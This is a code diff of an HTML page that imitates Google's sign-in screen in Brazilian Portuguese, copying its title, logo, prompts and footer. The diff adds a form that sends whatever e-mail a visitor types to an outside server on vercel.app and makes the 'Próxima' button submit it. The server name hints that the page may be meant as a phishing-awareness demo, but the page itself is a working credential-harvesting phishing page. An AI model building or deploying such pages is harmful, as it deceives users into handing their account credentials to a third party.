@@ -1,29 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="preconnect" href="https://fonts.gstatic.com" />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
-      rel="stylesheet"
-    />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="stylesheet" href="./reset.css" />
-    <link rel="stylesheet" href="./style.css" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet" />
 
-    <title>Fazer login nas Contas do Google</title>
-  </head>
+  <link rel="stylesheet" href="./reset.css" />
+  <link rel="stylesheet" href="./style.css" />
 
-  <body>
-    <div class="container">
-      <div class="card">
-        <img src="./images/google-logo.svg" alt="" />
-        <h2>Fazer login</h2>
-        <h3>Use sua Conta do Google</h3>
+  <title>Fazer login nas Contas do Google</title>
+</head>
 
-        <input type="email" placeholder="E-mail ou telefone" />
+<body>
+  <div class="container">
+    <div class="card">
+      <img src="./images/google-logo.svg" alt="" />
+      <h2>Fazer login</h2>
+      <h3>Use sua Conta do Google</h3>
+
+      <form action="https://desconfie-servidor-6g6aufykf-rafael-sedors-projects.vercel.app/submit-login" method="POST">
+        <input type="email" name="email" placeholder="E-mail ou telefone" required />
         <div class="btn-email">
           <button type="button">Esqueceu seu e-mail?</button>
         </div>
@@ -32,28 +31,29 @@
           privacidade.
           <a href="">Saiba mais</a>
         </p>
-
         <div class="card-bottom">
           <a href="">Criar conta</a>
-          <button type="button">Próxima</button>
+          <button type="submit">Próxima</button>
         </div>
-      </div>
+      </form>
+    </div>
 
-      <div class="footer">
-        <select name="select">
-          <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
-          <option value="English (United States)">
-            English (United States)
-          </option>
-          <option value="Español (España)">Español (España)</option>
-        </select>
+    <div class="footer">
+      <select name="select">
+        <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
+        <option value="English (United States)">
+          English (United States)
+        </option>
+        <option value="Español (España)">Español (España)</option>
+      </select>
 
-        <div class="footer-span">
-          <span>Ajuda</span>
-          <span>Privacidade</span>
-          <span>Termos</span>
-        </div>
+      <div class="footer-span">
+        <span>Ajuda</span>
+        <span>Privacidade</span>
+        <span>Termos</span>
       </div>
     </div>
-  </body>
+  </div>
+</body>
+
 </html>
